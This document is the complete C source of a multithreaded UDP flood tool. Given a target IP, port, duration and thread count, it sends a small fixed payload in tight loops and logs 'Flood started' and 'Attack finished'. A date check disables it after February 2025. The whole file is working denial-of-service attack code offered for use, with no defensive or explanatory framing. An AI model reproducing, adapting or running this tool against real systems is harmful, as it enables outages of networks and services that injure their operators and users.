#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <errno.h>
#include <time.h>

#define BATCH_SIZE 64
#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 2
#define EXPIRY_DAY 28

struct thread_data {
    char ip[16];
    int port;
    int time;
};

int is_expired() {
    time_t now = time(NULL);
    struct tm *local_time = localtime(&now);

    if ((local_time->tm_year + 1900) > EXPIRY_YEAR) return 1;
    if ((local_time->tm_year + 1900) == EXPIRY_YEAR &&
        (local_time->tm_mon + 1) > EXPIRY_MONTH) return 1;
    if ((local_time->tm_year + 1900) == EXPIRY_YEAR &&
        (local_time->tm_mon + 1) == EXPIRY_MONTH &&
        local_time->tm_mday > EXPIRY_DAY) return 1;

    return 0;
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    struct msghdr msg;
    struct iovec iov;
    char payload[] = {0x91, 0x2C, 0x91, 0x00};
    time_t endtime = time(NULL) + data->time;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    memset(&msg, 0, sizeof(msg));
    iov.iov_base = payload;
    iov.iov_len = sizeof(payload);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_name = &server_addr;
    msg.msg_namelen = sizeof(server_addr);

    while (time(NULL) <= endtime) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            if (sendmsg(sock, &msg, 0) < 0) {
                perror("sendmsg failed");
                break;
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf("This file has expired and is no longer functional.\n");
        return 1;
    }

    struct thread_data data;
    strncpy(data.ip, argv[1], 15);
    data.ip[15] = '\0';
    data.port = atoi(argv[2]);
    data.time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_ids[threads];

    printf("Flood started on %s:%d for %d seconds with %d threads\n", data.ip, data.port, data.time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data = malloc(sizeof(struct thread_data));
        memcpy(thread_data, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished\n");
    return 0;
}
